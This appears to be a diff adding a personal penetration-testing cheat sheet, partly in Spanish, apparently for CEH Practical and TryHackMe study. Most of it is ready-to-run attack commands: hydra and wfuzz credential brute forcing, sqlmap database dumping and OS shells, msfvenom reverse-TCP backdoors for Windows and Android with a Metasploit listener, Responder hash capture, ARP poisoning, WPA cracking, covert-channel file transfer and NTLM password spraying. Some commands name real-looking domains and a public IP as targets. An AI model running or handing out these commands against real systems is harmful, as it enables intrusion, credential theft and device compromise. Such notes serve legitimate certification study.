@@ -1,0 +1,233 @@
+Discover
+	netdiscover
+		netdiscover -i eth0
+		or 
+		nmap -sn 192.168.*.0/24
+	Angry IP Scanner(Windows)
+	Find fqdn
+		nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
+	Service discovery
+		nmap -sT -v 192.168.18.110 -p-	
+	Windowssamba
+		enum4linux -a 192.168.18.110
+
+hydra
+	hydra -l <user> -P <rockyou.txt>  ftp://thm.thm  -s <10021 port>
+	hydra -l <user> -P <rockyou.txt> -f -v thm http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
+
+jtr
+	john --format=raw-md5 --wordlist=<rockyou.txt> hash.txt
+	unshadow [path to passwd] [path to shadow] (combine)
+
+Hashidentifier
+	To use hash-identifier, you can just pull the python file from gitlab using: 
+	wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py. 
+
+cewl Wordlist generator 
+	cewl http://thm -w output.txt
+	cewl -d 0 -m 5 -w usernames.txt http://thm/team.php --lowercase  (--usernames)
+	Specify spidering depth: The -d 
+	Set minimum and maximum word length: Use the -m and -x 
+
+Web server
+	nikto
+		nikto -h http://ip_address -o report.html
+		nmap -p80 172.16.0.0/24 -oG - | nikto -h -   (Rango de ips)
+		nikto -h 10.10.10.1 -p 80,8000,8080  (Multiple ports)
+		--list-plugins (List https://github.com/sullo/nikto/wiki/Plugin-list)
+		EX:
+			nikto -h 10.10.10.1 -Plugin apacheuser
+		-Tuning(File Upload, Misconfigurations / Default Files, Information Disclosure, Injection, Command Execution, SQL Injection)
+	Skipfish 
+		skipfish -o /home/directory -S /usr/share/skipfish/dictionaries/complete.wl http://xaferima.com
+	nmap -sV --script=http-enum site.com  (page 1245)
+	uniscan -u url -q(directories) -we(map, robots,siemap) -d(dynamic:emails,sourcecode,etc)
+
+
+WPSCAN
+	wpscan --url http://refal-edu.org/ --enumerate u (For users)
+		--enumerate vp (Vulns Plugins)
+	wpscan --url http://refal-edu.org/ --passwords /home/xaferima/Documents/payloads/rockyou.txt --usernames xaferima
+		--plugins-detection aggressive
+
+SQLMAP 
+    Simple usage sqlmap -u “https://target_site.com/page/”
+    Automatic GET request parameter sqlmap -u “https://target_site.com/page?p1=value1&p2=value2”
+    Use POST request sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2"
+    Request file as input(get it from Burpsuite) sqlmap -r request.txt
+    Use authenticated session with cookie sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"
+    Use authenticated session with auth headers sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --headers="Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l"
+    Basic authentication sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --auth-type=basic --auth-cred=username:password
+
+    Post exploitation(use these if the SQLi vuln is positive)
+
+    List databases sqlmap -u “https://target_site.com/page?p1=value1” --dbs
+    List tables of TARGET_DB sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables
+    List columns of TARGET_TABLE in TARGET_DB sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns
+    Dump specific data of columns sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump
+    Fully dump table sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump
+    Dump the entire database sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump
+    Custom SQL query sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"
+    Get OS shell sqlmap -u “https://target_site.com/page?p1=value1” --os-shell
+    Get SQL shell sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell
+    Use attack techniques sqlmap -u “https://target_site.com/page?p1=value1” --technique=BEUSTQ
+        B: Boolean-based blind
+        E: Error-based
+        U: Union query-based
+        S: Stacked queries
+        T: Time-based blind
+        Q: Inline queries
+
+
+samba 445
+	smbclient //192.168.0.X/name -U USER%password
+	smbclient -U 'user' \\\\<ip>\\Administrator 
+	nmap -T4 -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 48.21.33.124
+	medusa -M smbnt -v 4 -b -h srv01.acme.com -U smb-users.txt -P rockyou.txt
+	smbmap -H < Target IP > -u 'faiz' -p 'rebelde'
+
+nfs 
+	sudo mount -t nfs 10.10.1.74:/CyberQ ./nfs
+
+Remote windows
+	https://medium.com/@josicaleksandar981/how-to-install-and-use-evil-winrm-in-kali-linux-db7b73280ac3
+	/evil-winrm.rb -i 10.0.0.33 -u ‘bobjones’ -p ‘Password1’ -s ‘/home/kali/’ -e ‘/usr/share/windows-binaries/’
+
+Fuzz credentials post
+	wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://yhm/login.php -d "username=FUZZ&password=FUZ2Z"
+
+Gobuster fuzz
+	gobuster dir -u http://thm -w /usr/share/wordlists/
+	https://sohvaxus.github.io/content/gobuster.html
+	Wordlist
+	/usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
+    /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+    /usr/share/wordlists/dirb/big.txt
+    /usr/share/wordlists/dirb/common.txt
+    /usr/share/wordlists/dirb/small.txt
+    /usr/share/wordlists/dirb/extensions_common.txt - Useful for when fuzzing for files!
+    -x txt,php,etc
+
+Responder
+	git clone https://github.com/SpiderLabs/Responder
+	responder.py -I eth0 
+	Despues de obtenido utilizar john
+	*o 
+	hashcat 
+		hashcat -m 5600 <hash file> <password file> --force
+	*Otra opcion L0phtcrack para crack password
+
+Wireshark 
+	dns.qry.type == 1 (DNS A records only)
+	tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
+	tcp.flags.syn == 1   (Which machine for dos)
+	http.request.method == POST   (for passwords) or click tools ---> credentials
+
+	Statistics*(muy usable)
+	Analyze->expert information
+
+	Wifi protocol 802.11
+
+Metasploit
+	msfvenom
+		msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<local ip> -f exe > Backdoor.exe
+	Modules 
+	exploit/unix/ssh/seagate_nas_ssh_exec
+
+Steganograph
+	Snow in kali(Muchos saltos de linea)
+	stegsnow -C -m "my fucking snow" -p "magic" readme.txt stega  (Ocultar)
+	Openstego uso facil de la app, de imagen a texto
+
+Cain & Abel(MITM)
+	open cain(After installing on windows)
+	Configure->Sniffer->eth->ok
+	Start/stop sniffer(icono raro como una tarjeta de red)
+	Go to sniffer tab>Clic (+) -> all host on my subnet
+	it starts
+	Go to ARP tab(biohazard icon)-> New arp poison routing
+	Select route for arp posoning
+	Start/stop arp posoning(icono arriba biozahard)
+	Empieza a obtener user/pass en la pesta;a de abajo
+
+Crypto
+	haschcalculator,md5 calculator,hashmyfiles
+	Encrypt/decrypt with cryptoforge.exe,aep(advance encryption package)
+	BCTEXTENCODER->DECODE PLAIN TEXT->DECODE->ENTER PASSWORD AND OK
+	DISK ENCRYPTION VERACRYPT->SETUP->FINISH
+	VERACRYPT->SELECT FILE(AND I:)->MOUNT->PASS AND OK
+	BITLOCKER FOR THE SAME TO VERACRYPT
+	CRYPTOOL-INSTALL-RUN
+	CRYPTOOL->OPEN.HEX->DECRYPT->CHOOSE ALGORITHM->ENTER THE KEY
+	ALPHAPEELER THE SAME
+	binwalk entropy
+
+Wifi
+	airmon-ng start wlan0
+ 	airodump-ng -c 11 wlan0 (a single channel) --bssid
+ 	airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0
+ 	aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
+ 	aircrack-ng -w password.lst -a2 psk*.cap (-a2 WPA2)
+
+ 	WEP
+ 		wash -i wlan0mon (buscar)
+ 		hidden lenght 0 in airodump-ng
+ 		wifiphisher for wep
+ 	fern-wifi crack
+ 		wpa -wep
+Mobile
+	metasploit
+		msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik -LHost=IP R >Backdoor.apk (Pasar a android)
+		use exploit/multi/handler
+		set payload android/meterpreter/reverse_tcp
+		set options -> exploit -j -z
+		run app
+	ADB and phonesploit
+		apt-get install adb
+		git clone https://github.com/prbhtkumr/PhoneSploit
+		cd PhoneSploit
+		pip3 install colorama
+		python3 phonesploit.py
+		Opt 3(connect to new phone)
+		enter ip address
+		Opt 4(Access shell)
+		use phone in shell mode(ce sdcard)
+		Opt 15(Run an app)
+Covert channels
+	wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c
+	sudo apt install gcc
+	cc -o covert_tcp covert_tcp.c
+	sudo su
+	tcpdump -nvvX port 8888 -i lo  // do not need to, we dont get anything here
+	sudo ./covert_tcp -dest 192.168.18.144 -source 192.168.18.95 -source_port 9999 -dest_port 8888 -server -file /home/kali/msg.txt
+
+njrat
+	open njrat on windows
+
+Malware analysis
+	*detect it easy el mejor
+		wget https://github.com/horsicq/DIE-engine/releases/download/3.08/Detect_It_Easy-3.08-x86_64.AppImage
+chmod +x Detect_It_Easy-3.08-x86_64.AppImage
+		./Detect_It_Easy-3.08-x86_64.AppImage 
+	1. Perform Malware Scanning using Hybrid Analysis
+		https://www.hybrid-analysis.com/ Or virus total
+	2. Perform Strings Search using BinText
+
+
+Muy Utiles
+https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything%20You%20Need.md
+Secret.txt lab 2 task 2 
+Covert channels task 6 185p(678)
+Cain & abel>sniffin page 900(4329)
+
+
+Otros 
+ntlm_passwordspray
+		python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
+
+Host discovery:
+https://ceh-practical.cavementech.com/module-3.-scanning-networks/1.-host-discovery
+Enumeration windows:
+https://ceh-practical.cavementech.com/module-4.-enumeration/1.-netbios-enumeration-port-137
+Privilage escalation:
+https://ceh-practical.cavementech.com/module-6.-system-hacking/2.-privilege-escalation
